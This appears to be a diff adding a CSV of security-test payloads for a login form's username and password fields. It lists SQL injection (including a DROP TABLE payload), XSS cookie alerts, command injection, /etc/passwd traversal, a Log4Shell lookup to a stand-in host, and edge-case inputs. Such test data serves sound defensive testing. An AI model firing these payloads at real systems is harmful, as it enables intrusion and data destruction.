@@ -1,0 +1,54 @@
+﻿category,target_field,payload
+SQL Injection,username,' OR '1'='1
+SQL Injection,username,admin'--
+SQL Injection,username,admin'#
+SQL Injection,username,' OR 1=1--
+SQL Injection,username,' OR 'a'='a
+SQL Injection,username,admin' OR '1'='1'--
+SQL Injection,username,"admin' UNION SELECT 1,2,3--"
+SQL Injection,username,' UNION SELECT NULL--
+SQL Injection,username,') OR ('1'='1
+SQL Injection,username,' OR ''='
+SQL Injection,username,1' ORDER BY 1--
+SQL Injection,username,admin'/*
+SQL Injection,username,' AND (SELECT COUNT(*) FROM Admins)>0--
+SQL Injection,username,'; DROP TABLE Admins;--
+SQL Injection,username,' OR SLEEP(5)--
+SQL Injection,password,' OR '1'='1
+SQL Injection,password,' OR 1=1--
+SQL Injection,password,' OR 'x'='x
+SQL Injection,password,'; DROP TABLE Admins;--
+SQL Injection,password,' OR SLEEP(5)--
+XSS,username,<script>alert(1)</script>
+XSS,username,<img src=x onerror=alert(1)>
+XSS,username,<svg onload=alert(1)>
+XSS,username,<body onload=alert(1)>
+XSS,username,<iframe src=javascript:alert(1)>
+XSS,username,<details open ontoggle=alert(1)>
+XSS,username,<input autofocus onfocus=alert(1)>
+XSS,username,javascript:alert(1)
+XSS,username,<script>alert(document.cookie)</script>
+XSS,password,<img src=x onerror=alert(1)>
+XSS,password,<svg/onload=alert(1)>
+XSS,password,<script>alert(document.cookie)</script>
+NoSQL Injection,username,{$ne: null}
+NoSQL Injection,username,[$ne]=1
+LDAP Injection,username,*)(uid=*
+Command Injection,username,admin; ls -la
+Command Injection,username,admin | whoami
+Command Injection,username,$(whoami)
+Path Traversal,username,../../../../etc/passwd
+Path Traversal,username,....//....//etc/passwd
+Template Injection,username,${7*7}
+Template Injection,username,<%= 7*7 %>
+Log4Shell,username,${jndi:ldap://evil.local/a}
+CRLF Injection,username,admin%0d%0aSet-Cookie: x=1
+Null Byte,username,admin%00
+Homoglyph,username,аdmin@gmail.com
+Empty,username,
+Empty,password,
+Length,username,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Length,password,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Length,username,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Length,password,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Length,username,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
